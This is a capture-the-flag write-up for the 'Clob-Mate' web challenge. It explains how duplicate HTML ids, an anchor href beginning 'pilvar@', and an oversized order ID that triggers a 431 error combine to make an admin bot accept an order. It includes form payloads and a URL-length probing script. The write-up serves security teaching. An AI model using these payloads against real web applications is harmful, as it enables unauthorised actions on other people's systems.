---
description: DOM clobbering + request size denial of service
---

# Clob-Mate

## Description

> I heard there's a shortage of Clob-Mate, but you need your hacker fuel. You have to order some, no matter the cost.

{% file src="../../.gitbook/assets/web-clob-mate-source.tar.gz" %}

## Solution

### Initial Analysis

This challenge gives us a simple form that when submitted, shows our "order status".

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 9.48.37 PM.png" alt=""><figcaption></figcaption></figure>

Looking at the source code, we can see that the endpoint that creates the order takes in `article`, `quantity`, `username`, `address` and `email`, then generates an `order_id` based on the base64-encoded value of `article+quantity+username+address`.

```python
@main.route('/order/create', methods=['POST'])
@limiter.limit("40/minute")
def create_order():
  try:
    article = escape(request.form.get('article'))
    quantity = escape(request.form.get('quantity'))
    username = escape(request.form.get('username'))
    if username == "pilvar":
      if not ipaddress.ip_address(request.remote_addr).is_private:
        abort(403)
    address = escape(request.form.get('address'))
    email = escape(request.form.get('email'))
    order_id = codecs.encode((article+quantity+username+address).encode('ascii'), 'base64').decode('utf-8')
    order_id = order_id.replace("\n","") #I have no ideas where it happens, but I think there's a new line appended somewhere. Putting this line here and there fixed it.
    order = Order.query.filter_by(order_id=order_id).first()
    if order:
      iteration = 0
      order_id = order.order_id
      og_order_id = order_id
      while order:
          order_id = og_order_id+"-"+str(iteration)
          order = Order.query.filter_by(order_id=order_id).first()
          iteration += 1
    status = "Under review"
    new_order = Order(order_id=order_id,
                    email=email,
                    username=username,
                    address=address,
                    article=article,
                    quantity=quantity,
                    status=status)
    db.session.add(new_order)
    db.session.commit()
    q.enqueue(visit, order_id)
    return redirect("/orders/"+order_id+"/preview")
  except Exception as e:
    return(str(e))
```

This base64 value is then used in future URI paths that correspond to our order. This format of creating record IDs is a bit odd - alphanumeric IDs of a fixed length are the commonly-used format for these things, and more interestingly this format allows the user to create arbitrary-length URLs. This would come in handy later.

The app also exposes a `/orders/<order_id>/get_user_infos` API that allows us to query the `username`, `address` and `email` information of an order.&#x20;

```python
@main.route('/orders/<order_id>/get_user_infos')
def userinfos(order_id):
    order = Order.query.filter_by(order_id=order_id).first()
    return {'username': order.username, 'address': order.address, 'email': order.email}
```

The `/order/update` endpoint is where we get our flag - the admin needs to send a request that sets the `order_status` to `"accepted"`.

```python
@main.route('/order/update', methods=['POST'])
def update():
    if ipaddress.ip_address(request.remote_addr).is_private:
        order_id = request.form.get('order_id')
        order_status = request.form.get('order_status')
        if order_status == "accepted":
            order_status = os.getenv('FLAG')
        Order.query.filter_by(order_id=order_id).update({
            'status': order_status
            })
        db.session.commit()
        return redirect("/")
    else:
        return redirect("/")
```

The admin would visit our order preview, where the `inspect_order.html` template is rendered.

```python
@main.route('/orders/<order_id>/preview')
def order(order_id):
    if order_id:
        order = Order.query.filter_by(order_id=order_id).first()
        if not order:
            abort(404)
        if ipaddress.ip_address(request.remote_addr).is_private:
            article_infos = order.article.split(":")
            article_name = article_infos[0]
            article_link = article_infos[1]
            return render_template('inspect_order.html', order_id=order.order_id, article_name=article_name, article_link=article_link, quantity=order.quantity)
        else:
            return render_template('order_status.html', status=order.status)
    else:
        return redirect("/")
```

### DOM Clobbering

Let's take a look at the preview page! Our goal here is make `order.user.username` evaluate to `"pilvar"`, so that we reach the code path where `/order/update` request is sent with `order_status=accepted`.

```markup
<script type="text/javascript">
    //As we are getting out of stock, we decided to prioritize delivering our last Clob-Mates to real hackers. We also automated this task because it was taking a lot of time.
    order_id = "{{ order_id }}"
    fetch("get_user_infos").then(res => res.text()).then(txt => {
        try {
            user = JSON.parse(txt);
            order = { "user": {} };
            order.user = user;
            if (order.user.username == "pilvar") {
                fetch("/order/update", {
                    body: "order_id=" + order_id + "&order_status=accepted",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    method: "post",
                })
            } else {
                fetch("/order/update", {
                    body: "order_id=" + order_id + "&order_status=rejected",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    method: "post",
                })
            }
        }
        catch (err) {
            console.log("Couldn't send the data, trying again.");
            if (order.user.username == "pilvar") {
                fetch("/order/update", {
                    body: "order_id=" + order_id + "&order_status=accepted",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    method: "post",
                })
            } else {
                fetch("/order/update", {
                    body: "order_id=" + order_id + "&order_status=rejected",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    method: "post",
                })
            }
        }
    })
</script>
```

Quite interestingly, the `fetch("/order/update")` call is performed again if an exception is raised in the `try` block.&#x20;

Note that none of the variables are declared with the `var` or `let` keywords, making all of them [global variables](https://www.w3schools.com/js/js\_scope.asp). Because in HTML the global scope is the `window` object, one effect of this is that if any of the HTML elements have their `id` set to `order`, the global variable `order` (`window.order`) would refer to that element!

This is known as [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering), a technique hinted by the challenge name.

```markup
<body>
    <p id="order" name="{{ order_id }}"><b>Order ID: </b>{{ order_id }}</p>
    <p><b>Article:</b> <a id="order" name="{{ article_name }}" href="/{{ article_link }}">{{ article_name }}</a></p>
    <p id="order" name="{{ quantity }}"><b>Quantity: </b>{{ quantity }}</p>
</body>
```

Because the bottom of the page contains elements with their `id`s set to `order`, the original value of `order` is a `HTMLCollection` object containing these elements.

But since `order` is being set in the `try` block, this vulnerability can only happen if we trigger an exception at the `JSON.parse` line _before_ the `order` variable is changed.

```javascript
try {
    user = JSON.parse(txt);
    order = { "user": {} };
    order.user = user;
    
    ...
```

At this point we don't yet know how to trigger the exception, but let's first try and see if our hypothesis works. We could test this by adding a `throw` statement before `order` is changed.

```javascript
try {
    user = JSON.parse(txt);
    throw "";
    order = { "user": {} };
    order.user = user;
```

The `order` variable is indeed a `HTMLCollection`!

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 10.53.51 PM.png" alt=""><figcaption></figcaption></figure>

Recall that our goal is to set `order.user.username`. To control `order.user`, we could use the `name` attribute that is set on the anchor and paragraph tags.&#x20;

Right now, our form body looks like this:

```
username=x&email=x&address=1&quantity=user&article=user:x
```

which sets the following body:

```markup
<body>
    <p id="order" name="dXNlcjp4dXNlcngx"><b>Order ID: </b>dXNlcjp4dXNlcngx</p>
    <p><b>Article:</b> <a id="order" name="user" href="/x">user</a></p>
    <p id="order" name="user"><b>Quantity: </b>user</p>
</body>
```

Now `order.user` would return the anchor tag element. Great!

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 10.57.57 PM.png" alt=""><figcaption></figcaption></figure>

Curiously though, `order.user.username` is an empty string, instead of `undefined`.

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 11.00.04 PM.png" alt=""><figcaption></figcaption></figure>

This was strange indeed! The `username` property is in fact part of the anchor tag element object's prototype.

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 11.01.46 PM.png" alt=""><figcaption></figcaption></figure>

It turns out that the anchor tag's username property actually refers to the username part of the `href` value (see [this](https://www.w3schools.com/jsref/prop\_anchor\_username.asp)). This meant that in order to set `order.user.username` to `pilvar`, all we had to do was to supply a URL starting with `pilvar@` to the `href` attribute.

```
username=x&email=x&address=1&quantity=user&article=user:/pilvar@x.com
```

### Triggering the Exception

Now comes the tricky part - how do we trigger the exception in the first place?

My first thought was to look for interoperability issues between Flask's JSON response and JavaScript's `JSON.parse`. I tried things like weird unicode characters and JSON comments, but nothing worked. One nap later I convinced myself that both Flask and JavaScript are probably spec-compliant when handling JSON, and I was probably not intended to find a JSON parsing 0-day.

If JSON parsing is out of the question, then the only way to cause an exception here is to make the `/order/<order_id>/get_user_infos` endpoint return something that is _not_ JSON in the first place! Going back to the `/order/create` endpoint, I started to question the weird `order_id` format.

```python
order_id = codecs.encode((article+quantity+username+address).encode('ascii'), 'base64').decode('utf-8')
order_id = order_id.replace("\n","")
```

We know that the user can create arbitrary-length order IDs, and we need `get_user_infos` to somehow fail. Since the `/order/<order_id>/preview` URL is 7 bytes shorter than the `/order/<order_id>/get_user_infos` one, there is a 7-byte window where `preview` would succeed but `get_user_infos` will fail due to URL length limits enforced by the web server. This is a known technique that in some cases can be helpful in performing XS-Leaks.

In the case of Waitress, the 431 Request Header Fields Too Large response code is returned.

```http
HTTP/1.0 431 Request Header Fields Too Large
Connection: close
Content-Length: 90
Content-Type: text/plain
Date: Sun, 25 Sep 2022 07:58:27 GMT
Server: waitress

Request Header Fields Too Large

exceeds max_header of 262144

(generated by waitress)
```

Using this script to binary search for the longest URL we could get before the error occurs, I got an approximate length for the `order_id` to trigger this exploit.

```javascript
let URL_LIMIT = 1000000

const checkLoad = async (url) => {
    let res = await fetch(url)
    return res.ok
}

const genUrl = (url, n) => {
    let seperator = url.includes('?') ? '&foo=' : '?foo='
    let endMarker = 'END'
    let l  = n - url.length - seperator.length - endMarker.length
    let newUrl = url + seperator + 'a'.repeat(l) + endMarker
    if(newUrl.length !== n){
        console.debug(`[!] ${newUrl.length} !== ${n}`)
    }
    return newUrl

}

const calibrate = async (url) =>  {
    let l = 0, r = URL_LIMIT, m = 0, res = false
    while (l < r) {
        m = Math.floor((l + r) / 2)
        res = await checkLoad(genUrl(url, m))
        console.log(res, m)
        if(res === false){
            r = m - 1
        }
        else{
            l = m + 1
        }

    }
    // check it again
    res = await checkLoad(genUrl(url, l))
    if(res === false){
        l--
    }
    res = await checkLoad(genUrl(url, l))
    if(res === false){
        console.debug('Error after last check !!!')
        return 0
    }
    console.debug(`DONE: length: ${l}, result: ${res}`)
    return l
}

calibrate("http://localhost:1337")
```

The next step is to take our current payload, and pad any of the fields (except for `article`) with enough bytes to get the corresponding `order_id` length.

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-25 at 4.35.54 PM.png" alt=""><figcaption></figcaption></figure>

A few moments later the admin visits our preview page and gets the flag!

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-25 at 4.35.27 PM.png" alt=""><figcaption></figcaption></figure>

While this method used the 7-byte difference between the two URLs to calculate the `order_id` length, the exploit is actually made much simpler by the fact that the `Referer` header is sent on the second request containing the order URL (I only noticed this after the competition).

Because the error is caused by the total length of the request line + headers, the long `Referer` header meant that the precision of calculating the required `order_id` length was not that important and a large range of lengths would have worked.
